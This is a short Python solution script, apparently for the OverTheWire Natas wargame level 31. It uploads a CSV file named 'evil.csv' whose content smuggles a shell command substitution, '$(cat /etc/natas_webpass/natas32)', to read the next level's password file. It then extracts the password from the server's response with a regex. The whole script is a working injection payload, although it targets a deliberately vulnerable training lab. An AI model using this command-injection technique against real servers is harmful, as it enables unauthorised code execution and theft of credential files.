import requests
import re

url = "http://natas31.natas.labs.overthewire.org/index.pl?"
auth = ("natas31", "[PW_HERE]")

session = requests.Session()
session.auth = auth

# Payload: include command substitution in the CSV content
payload = b"A,B\n1,2\n$(cat /etc/natas_webpass/natas32),2"

files = [('file', ('evil.csv', payload))]

r = session.post(url, files=files)

# Print HTML to debug
#print(r.text)

# Look for a password pattern like: natas32:somepassword
password_regex = re.compile(r'(natas32:[a-zA-Z0-9]+)')
found = password_regex.findall(r.text)
print(found)


